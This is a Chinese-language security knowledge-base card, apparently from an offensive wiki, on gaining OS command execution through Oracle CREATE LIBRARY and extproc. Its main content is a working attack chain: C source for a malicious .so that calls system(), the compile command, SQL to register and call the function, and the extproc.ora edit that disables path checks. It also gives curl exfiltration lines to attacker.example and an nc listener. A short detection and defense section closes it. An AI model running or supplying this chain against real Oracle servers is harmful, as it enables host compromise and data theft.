---
id: web-generic-sqli-oracle-create-library-external-so-command-exec
title: Oracle CREATE LIBRARY 外部库加载恶意 .so：以数据库进程权限执行系统命令
type: scenario
domain: web
path: web/generic/sqli
technique: oracle-create-library-external-so-command-exec
tags:
- oracle
- sql-injection
- rce
- library
- extproc
- plsql
- udf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V518
  verified_at: '2026-11-11T13:07:02+08:00'
  notes: 已对照原文与59张截图核对：CREATE LIBRARY lib_evil AS '/home/oracle/evil.so'、LANGUAGE C 外部函数 name 语义、ORA-28595、extproc.ora 的 EXTPROC_DLLS=ONLY:/home/oracle/evil.so/ANY 与默认白名单 bin/lib、select cmd('/bin/curl ...') 回显 ok 及 nc 收到 curl 请求（图32-37）均一致；NAME 为 so 内导出函数名的说法与图59一致。未验证点：PoC 未复跑；原文未给受影响版本，frontmatter 无 sources/source_url。dedup：与 MySQL UDF 卡 related 但机制不同，与同篇卡2同 sink 但入口/投递链不同，保留。
url: /docs/web/generic/sqli/web-generic-sqli-oracle-create-library-external-so-command-exec/
draft: false
kb_aliases:
- Oracle CREATE LIBRARY 提权
- Oracle 外部过程命令执行
- Oracle UDF 提权
- extproc.ora EXTPROC_DLLS
- ORA-28595 Invalid DLL Path
---

## 一句话结论

拿到 Oracle 高权限账号（DBA 或具备 `CREATE LIBRARY`/`CREATE PROCEDURE`）后，不依赖 Oracle JVM 也能命令执行：`CREATE LIBRARY` 把攻击者编译的恶意 `.so` 注册进数据库，再用 `CREATE FUNCTION ... LANGUAGE C` 映射到 so 中的函数，调用 SQL 函数即由 extproc 代理进程加载并在数据库主机上执行 `system()`，效果类似 MySQL UDF 提权。

## 原理

- **外部过程机制**：Oracle 允许外部过程（external procedure）调用操作系统共享库。`CREATE [OR REPLACE] LIBRARY lib_name AS '/path/lib.so';` 把共享库路径登记为数据库对象；`CREATE FUNCTION f(...) RETURN ... AS LANGUAGE C LIBRARY lib_name NAME "func";` 建立「SQL 函数名 → so 内导出函数」的映射。
- **执行发生在宿主**：调用该函数时，由 extproc 代理进程加载 so 并执行其中代码，权限是 Oracle 软件安装用户（通常是 `oracle`），而不是数据库内部的 Java 沙箱。因此在 so 里写 `system(command)` 即可执行任意系统命令，`system`/`euid` 均为 oracle 用户。
- **`NAME` 字段的语义**：`NAME "cmd"` 指定的是「要调用的外部库函数名」，不是 SQL 函数名；两者不一致时调用失败或找不到符号，这是常见踩坑点。
- **加载白名单（ORA-28595）**：extproc 默认只允许加载 `$ORACLE_HOME/bin`、`$ORACLE_HOME/lib` 下的库；指向任意路径会报 `ORA-28595: Extproc agent: Invalid DLL Path`。需要在 `$ORACLE_HOME/hs/admin/extproc.ora` 中设置：
  - `SET EXTPROC_DLLS=ONLY:/home/oracle/evil.so`（仅放行指定库），或
  - `SET EXTPROC_DLLS=ANY`（关闭路径校验），或
  - 直接把 so 放进 `$ORACLE_HOME/lib` 等默认白名单目录，免改配置。
- **与 Java Source 的差异**：Java Source 在 Oracle JVM 内执行，受 Java 安全管理器约束，常需 `DBMS_JVM_EXP_PERMS`/`dbms_java.grant_permission` 授 `java.io.FilePermission`、`RuntimePermission` 等才能落盘或执行命令；外部库走的是 extproc 原生进程，没有这层 Java 沙箱，权限更直接，但需要能修改 extproc 配置或利用默认库路径。

## 触发条件

- Oracle 账号具备 `CREATE LIBRARY`/`CREATE ANY LIBRARY`、`CREATE PROCEDURE`/`CREATE ANY PROCEDURE`（DBA 天然满足），且 extproc 功能可用。
- 能向数据库主机写入 so 文件（本机 shell、任意文件写漏洞、Java Source 写文件、备份/导出等）。
- extproc 允许加载该路径（改 `extproc.ora`、或 so 落在 `$ORACLE_HOME/bin|lib` 默认白名单内）。
- 能执行 SQL 调用函数：SQL 注入、sqlplus、应用连接均可。

## 利用步骤

1. 编写恶意代码并编译为共享库（Linux 为 `.so`）：
   ```c
   #include <stdlib.h>
   char* cmd(char* command) {
       system(command);
       return "ok";
   }
   ```
   `gcc -shared -fPIC evil.c -o evil.so`
2. 把 so 上传/写入数据库主机可控路径，例如 `/home/oracle/evil.so`。
3. 注册 Library 与外部函数：
   ```sql
   create or replace library lib_evil as '/home/oracle/evil.so';
   /
   create or replace function cmd(str varchar2) return varchar2
     as language c library lib_evil name "cmd";
   /
   ```
4. 调用执行命令：`select cmd('whoami') from dual;`，或 `select cmd('/bin/curl http://attacker:7775/`whoami`') from dual;` 外带回显。
5. 若报 `ORA-28595: Extproc agent: Invalid DLL Path`，在 `$ORACLE_HOME/hs/admin/extproc.ora` 末尾加 `SET EXTPROC_DLLS=ONLY:/home/oracle/evil.so`（或 `SET EXTPROC_DLLS=ANY`）后重试。
6. 无回显场景可用 DNS/HTTP 外带（如 `curl http://attacker/?x=$(whoami)`）确认执行。

## PoC

```sql
-- 前提：/home/oracle/evil.so 已由 gcc -shared -fPIC evil.c -o evil.so 生成，cmd() 内调用 system()
create or replace library lib_evil as '/home/oracle/evil.so';
/
create or replace function cmd(str varchar2) return varchar2
  as language c library lib_evil name "cmd";
/
-- 命令执行与回显
select cmd('whoami') from dual;
-- 外带验证
select cmd('/bin/curl http://attacker.example:7775/`whoami`') from dual;
```

```bash
# 攻击端监听，可直接看到 curl 请求
nc -lvnp 7775
```

## 变体与关联

- **so 落地目录变体**：把 so 写入 `$ORACLE_HOME/lib`（如在 Oracle 23c Free 中为 `/opt/oracle/product/23c/dbhomeFree/lib/`）可命中默认白名单，无需修改 `extproc.ora`；也可先写入 `$ORACLE_HOME` 根目录再配合 `ONLY:` 放行。
- **无法直接上传 so 时的投递**：可先用 Java Source 写文件能力把 gzip 压缩的 so 字节解压落地（见 [[web-generic-sqli-oracle-waf-java-source-write-so-library-rce]]），再走本卡流程。
- **同类数据库机制**：MySQL UDF 提权（`CREATE FUNCTION ... SONAME`）、MSSQL `sp_OACreate`/CLR 程序集、PostgreSQL `COPY ... TO PROGRAM`，都是「数据库高权限 → 宿主命令执行」。
- **Oracle 其它执行面**：Java Source + `Runtime.exec`（受 JVM 沙箱与授权约束）、`dbms_xmlquery.newcontext` 动态执行（见 [[web-generic-sqli-oracle-dbms-xmlquery-java-source-command-exec]]）、`dbms_scheduler` 建外部作业、`utl_http`/`utl_inaddr` 出网。

## 检测与防御

- **检测**：审计 `CREATE LIBRARY`、`LANGUAGE C` 形式的函数创建；监控 `ORA-28595` 报错；extproc 进程（`extproc`/`oracle` 用户）异常派生子进程或发起对外连接；`extproc.ora` 出现 `EXTPROC_DLLS=ANY` 或非默认路径的改动。
- **防御**：应用/业务账号最小权限，禁止 `CREATE LIBRARY`/`CREATE ANY LIBRARY`、`CREATE PROCEDURE`；extproc 保持 `EXTPROC_DLLS` 严格白名单（禁用 ANY），必要时仅允许 `$ORACLE_HOME` 内受控库；限制 `$ORACLE_HOME` 目录写权限；数据库账号与主机侧做行为基线告警。
